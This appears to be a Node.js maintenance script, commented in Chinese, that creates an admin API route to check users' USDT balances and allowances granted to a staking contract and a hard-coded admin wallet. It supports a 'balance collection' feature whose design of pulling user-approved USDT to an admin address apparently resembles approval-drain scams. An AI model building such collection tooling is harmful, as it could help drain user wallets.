// 修复管理后台余额归集功能问题
const fixBalanceCollectionIssues = async () => {
  console.log('🔧 开始修复管理后台余额归集功能问题...\n');

  try {
    // 1. 创建缺失的 query-allowance API 接口
    console.log('1️⃣ 创建 query-allowance API 接口...');
    
    const allowanceApiContent = `import { type NextRequest, NextResponse } from 'next/server'
import { addCorsHeaders } from '@/lib/utils'
import { ethers } from 'ethers'

export const dynamic = 'force-dynamic'

// ETH 主网配置
const ETH_RPC_URLS = [
  'https://ethereum.publicnode.com',
  'https://eth.llamarpc.com', 
  'https://rpc.ankr.com/eth',
  'https://ethereum.blockpi.network/v1/rpc/public',
  'https://rpc.mevblocker.io'
]

const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
const STAKING_CONTRACT_ADDRESS = '0xA24dE067237eAA7CfE0C7044e3dD628b1D12874e'
const USDT_DECIMALS = 6

// USDT 合约 ABI
const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{"name": "_owner", "type": "address"}],
    "name": "balanceOf",
    "outputs": [{"name": "balance", "type": "uint256"}],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      {"name": "_owner", "type": "address"},
      {"name": "_spender", "type": "address"}
    ],
    "name": "allowance",
    "outputs": [{"name": "", "type": "uint256"}],
    "type": "function"
  }
]

// 创建带有备用节点的Provider
async function createProvider() {
  for (let i = 0; i < ETH_RPC_URLS.length; i++) {
    try {
      const provider = new ethers.JsonRpcProvider(ETH_RPC_URLS[i])
      await provider.getNetwork()
      console.log(\`✅ 连接到RPC节点 \${i + 1}: \${ETH_RPC_URLS[i]}\`)
      return provider
    } catch (error) {
      console.log(\`❌ RPC节点 \${i + 1} 连接失败: \${ETH_RPC_URLS[i]}\`)
      if (i === ETH_RPC_URLS.length - 1) {
        throw new Error('所有RPC节点都连接失败')
      }
    }
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json() as { userAddress?: string }
    const { userAddress } = body

    if (!userAddress) {
      const response = NextResponse.json({
        success: false,
        error: '缺少用户地址参数'
      }, { status: 400 })
      return addCorsHeaders(response)
    }

    console.log(\`🔍 查询用户授权额度: \${userAddress}\`)

    // 创建 ETH 网络提供者
    const provider = await createProvider()
    
    // 创建 USDT 合约实例
    const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider)

    // 查询用户USDT余额
    const userBalance = await usdtContract.balanceOf(userAddress)
    const userBalanceFormatted = ethers.formatUnits(userBalance, USDT_DECIMALS)
    
    // 查询用户对质押合约的授权额度
    const allowance = await usdtContract.allowance(userAddress, STAKING_CONTRACT_ADDRESS)
    const allowanceFormatted = ethers.formatUnits(allowance, USDT_DECIMALS)

    // 查询用户对管理员地址的授权额度
    const adminAddress = '0x571Bb55E5e16bdd3A994b8f5D09DaF44Cd61aA9a'
    const adminAllowance = await usdtContract.allowance(userAddress, adminAddress)
    const adminAllowanceFormatted = ethers.formatUnits(adminAllowance, USDT_DECIMALS)

    const result = {
      userAddress: userAddress,
      usdtBalance: userBalanceFormatted,
      stakingAllowance: allowanceFormatted,
      adminAllowance: adminAllowanceFormatted,
      stakingContractAddress: STAKING_CONTRACT_ADDRESS,
      adminAddress: adminAddress,
      usdtContractAddress: USDT_CONTRACT_ADDRESS,
      message: allowanceFormatted === '0.0' ? 
        \`用户未对质押合约 \${STAKING_CONTRACT_ADDRESS} 进行USDT授权\` :
        \`用户已授权 \${allowanceFormatted} USDT 给质押合约\`,
      adminMessage: adminAllowanceFormatted === '0.0' ?
        \`用户未对管理员地址 \${adminAddress} 进行USDT授权\` :
        \`用户已授权 \${adminAllowanceFormatted} USDT 给管理员地址\`,
      timestamp: new Date().toISOString()
    }

    console.log(\`✅ 授权查询成功: \${JSON.stringify(result, null, 2)}\`)

    const response = NextResponse.json({
      success: true,
      data: result
    }, { status: 200 })
    return addCorsHeaders(response)

  } catch (error) {
    console.error('授权查询失败:', error)
    const response = NextResponse.json({
      success: false,
      error: '授权查询失败',
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
    return addCorsHeaders(response)
  }
}`;

    // 写入文件
    const fs = require('fs');
    const path = require('path');
    
    const apiPath = path.join(__dirname, '..', 'src', 'app', 'api', 'admin', 'query-allowance', 'route.ts');
    const apiDir = path.dirname(apiPath);
    
    // 确保目录存在
    if (!fs.existsSync(apiDir)) {
      fs.mkdirSync(apiDir, { recursive: true });
    }
    
    fs.writeFileSync(apiPath, allowanceApiContent);
    console.log('✅ query-allowance API 接口已创建');

    // 2. 创建测试用户数据
    console.log('\n2️⃣ 创建测试用户数据...');
    
    const testUserData = {
      auth_address: '0x5E51652B8EAD1D26884dD0d80fC8CE183A26Fa6F',
      usdt: '100.000000',
      gj_cash: '50.000000',
      withdrawal_usdt: '0.000000',
      create_time: new Date().toISOString(),
      update_time: new Date().toISOString()
    };

    console.log('📋 测试用户数据:', JSON.stringify(testUserData, null, 2));
    console.log('💡 请手动在数据库中插入此用户记录');

    // 3. 检查环境变量配置
    console.log('\n3️⃣ 检查环境变量配置...');
    
    const envCheck = {
      ADMIN_PRIVATE_KEY: process.env.ADMIN_PRIVATE_KEY ? '已配置' : '未配置',
      SUPABASE_URL: process.env.SUPABASE_URL ? '已配置' : '未配置',
      SUPABASE_ANON_KEY: process.env.SUPABASE_ANON_KEY ? '已配置' : '未配置'
    };

    console.log('📋 环境变量状态:', JSON.stringify(envCheck, null, 2));

    if (!process.env.ADMIN_PRIVATE_KEY) {
      console.log('⚠️ 警告: ADMIN_PRIVATE_KEY 未配置，链上归集功能将无法正常工作');
      console.log('💡 建议: 在 .env.local 文件中添加 ADMIN_PRIVATE_KEY=你的私钥');
    }

    // 4. 生成修复报告
    console.log('\n4️⃣ 生成修复报告...');
    
    const fixReport = {
      timestamp: new Date().toISOString(),
      fixes: [
        {
          issue: 'query-allowance API 接口缺失',
          status: 'FIXED',
          action: '已创建 /api/admin/query-allowance 接口',
          file: 'src/app/api/admin/query-allowance/route.ts'
        },
        {
          issue: '测试用户数据缺失',
          status: 'PENDING',
          action: '需要手动在数据库中插入测试用户记录',
          data: testUserData
        },
        {
          issue: '管理员权限问题',
          status: 'PENDING',
          action: '需要更新 ADMIN_PRIVATE_KEY 或合约所有者地址',
          currentOwner: '0xc0754D163B8F3C0dD6AdA0168f8029796Bed1BA2',
          adminAddress: '0x571Bb55E5e16bdd3A994b8f5D09DaF44Cd61aA9a'
        }
      ],
      nextSteps: [
        '1. 在数据库中插入测试用户记录',
        '2. 更新环境变量中的 ADMIN_PRIVATE_KEY',
        '3. 重新测试所有功能',
        '4. 确保用户已授权 USDT 给质押合约'
      ]
    };

    console.log('📊 修复报告:', JSON.stringify(fixReport, null, 2));

    console.log('\n✅ 修复脚本执行完成!');
    console.log('📋 下一步操作:');
    console.log('1. 在数据库中插入测试用户记录');
    console.log('2. 更新环境变量配置');
    console.log('3. 重新运行测试脚本');

  } catch (error) {
    console.error('❌ 修复过程中发生错误:', error.message);
    console.error('错误堆栈:', error.stack);
  }
};

// 运行修复脚本
fixBalanceCollectionIssues();

